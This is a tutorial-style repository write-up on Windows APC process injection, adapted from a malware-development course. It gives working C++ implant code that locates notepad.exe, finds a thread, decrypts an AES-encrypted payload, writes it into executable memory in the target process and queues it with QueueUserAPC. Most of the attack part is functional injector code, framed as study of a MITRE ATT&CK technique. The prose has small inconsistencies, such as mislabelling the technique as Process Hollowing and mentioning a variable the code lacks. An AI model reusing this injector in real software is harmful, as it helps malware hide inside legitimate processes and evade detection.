# Wumbobfuscating Process Injection Techniques
The C/C++ code exemplifying the process injection techniques below was originally written by [Sektor7 Institute](https://institute.sektor7.net/) within their [Malware Development Intermediate](https://institute.sektor7.net/courses/rto-maldev-intermediate) course. The explanations and analysis of the code are entirely my own.

## Asynchronous Procedure Call (APC) Injection

### Background
Process injection describes a collection of attack techniques involving the execution of arbitrary code into a live process. Beyond the execution of arbirtrary code, successful process injection may lead to privilege escalation and/or access to the system/network resources of a hijacked process.

Note that successful process injection requires significant prototyping, as the manipulation of a targeted process or thread may cause it to crash before, during, or after successful payload execution.

A process injection subtechnique known as Asynchronous Procedure Call (APC) Injection involves the use of an [Asynchronous Procedures Call (APC)](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls), a function that executes asychronously in the context of a thread, to execute arbitrary code in the address space of a separate, live process. This is achieved by attaching the arbitrary code - containing a pointer to a payload - to the Asynchronous Procedure Call (APC) Queue, a structure within a thread that handles and execute APC functions when the thread enters an **Alertable State**. **Alertable State** occurs when a thread calls either `SleepEx()`, `SignalObjectAndWait()`, `MsgWaitForMultipleObjectsEx()`, `WaitForMultipleObjectsEx()`, or `WaitForSingleObjectEx()`. Note that there is no action by the implant process to cause the thread to enter **Alterable State**, and that the implant must wait until the thread calls one of these functions on its own.

Compared to other process injection subtechniques, Asynchronous Procedure Call (APC) Injection is less stable, and may cause the process to crash.

Once **Alertable State** has been reached, the arbitrary code containing the pointer is executed, redirecting to the payload. A more detailed explanation of APC Injection, that includes the stages and key functions used to achieve it, is below.

Asynchronous Procedure Call (APC) is defined in the MITRE ATT&CK Framework as [T1055.004](https://attack.mitre.org/techniques/T1055/004/)

The development process below is an extension to [the process injection template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md) contained in this repository.

## Developing Asynchronous Procedure Call (APC) Techniques

#### Asynchronous Procedure Call (APC) Injection Stages

1. [`CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot), [`EnumProcesses()`](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses) - A list of running processes is generated.
</br> _Note: The enumeration and location of the target process takes place via a custom [`FindTarget()`](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting) function defined in the [Process Injection Template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption)_
2. [`Process32First`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) - Information about first process in the list created by the previous stage (`CreateToolhelp32Snapshot()`) is retrieved.
3. [`Process32Next`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) - Information about first process in the list created by the previous stage (`CreateToolhelp32Snapshot()`) is discovered.
4. [`CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) - A list of running threads is generated.
5. [`Thread32Next()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next) - Threads in the list returned by [`CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) are iterated through, so that a thread corresponding to the targeted process can be discovered.
6. [`OpenThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) - A handle to the targeted thread is opened and returned to the program.
7. [`VirtualAllocEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) - An empty buffer of memory is allocated within the a target process.
8. [`WriteProcessMemory`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) - The payload is written into the allocated memory within the target process.
9. [`QueueUserAPC`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) - Execute the payload by adding an Asynchronous Procedure Call (APC) object to a thread APC Queue, which contains a pointer to the payload, and wait for the thread to enter **Alertable State**.
</br> _Note: Although not a function used by the implant, note that the thread enters **Alertable State** only when the thread makes one of the following calls: `SleepEx()`, `SignalObjectAndWait()`, `MsgWaitForMultipleObjectsEx()`, `WaitForMultipleObjectsEx()`, `WaitForSingleObjectEx()`

It is important to underscore that, while classic process injection targets a running process, Asynchronous Procedure Call (APC) Injection goes several layers deeper in its use of threads, and the Asychronous Procedure Call (APC) queue. For this reason, in addition to different injection technique, a second targeting function is required to locate the running thread, after [the initial process targeting function](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting). A fluid understanding of process threads and Asychronous Procedure Calls (APCs) is necessary to properly implement APC Injection.

#### Asynchronous Procedure Call (APC) Injection Typedef
The Process Hollowing technique development exemplified here relies on an expanded number of [typedefs to key process injection functions](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-injection-function-typedef). Further explanation of these functions can be found in the [NTAPI Undocumented Functions website](http://undocumented.ntinternals.net/). Links to specific function definitions are placed in the comments within the code block below:

```c++
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	
```

#### Thread Targeting
After [process targeting](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting) has occurred, a custom `FindThread()` function takes in the targeted Process ID (PID) and uses [`CreateToolhelp32Snapshot()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) is called with the `TH32CS_SNAPTHREAD` argument to generate a list of running threads within the target process. A `while` loop checks each entry (`thEntry`) of this list by calling [`Thread32Next()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next), and compares (`==`) the Process ID (PID) (`th32OwnerProcessID`) to the PID of the targeted process. When a matching PID is located, `FindThread()` calls [`OpenThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) to return the handle of the corresponding thread.

Note that, in this example, `FindThread()` is not called within the `main()` function of the implant, only within the proceeding Asynchronous Procedure Call (APC) Injection function (`InjectAPC`), where it returns the handle to the targeted thread.

```c++
// Credit: reenz0h (@sektor7net), RTO Malware Development Essentials course
HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}
```

#### Asynchronous Procedure Call (APC) Injection
Note that this function begins by declaring a null handle (`hSection`) to the target section, and a null pointer to the payload. The null handle to the thread (`hThread`) is re-declared as the return value of the custom `FindThread()` function, which takes the target Process ID (PID) as an argument and returns a handle to a targetable thread within the process.

After these declarations, the function calls [`VirtualAllocEx()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate executable memory into a target process (`hProc`), [`WriteProcessMemory()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the payload (`pRemoteCode`) into this newly allocated memory within the process (`hProc`), and the [AES Decryption (`AESDecrypt()`](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption) function is called, corresponding to the AES encryption performed in the [process injection template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption).

Then, [`QueueUserAPC`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) is called to add the pointer to the payload (`pRemoteCode`) as an APC object to a thread APC Queue, and wait for the thread to enter **Alertable State**. Note that the [`QueueUserAPC()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) function should cast the pointer (`pRemoteCode`) argument as a [PAPCFUNC Callback Function](https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-papcfunc), which is a type specifically used to designate addresses within the Asychronous Procedure Call (APC) Queue.

```c++
int InjectAPC(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;

	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}

	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));	

	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
	
	return 0;
}
```

#### Implementation

```c++
int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			InjectAPC(pid, hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
```
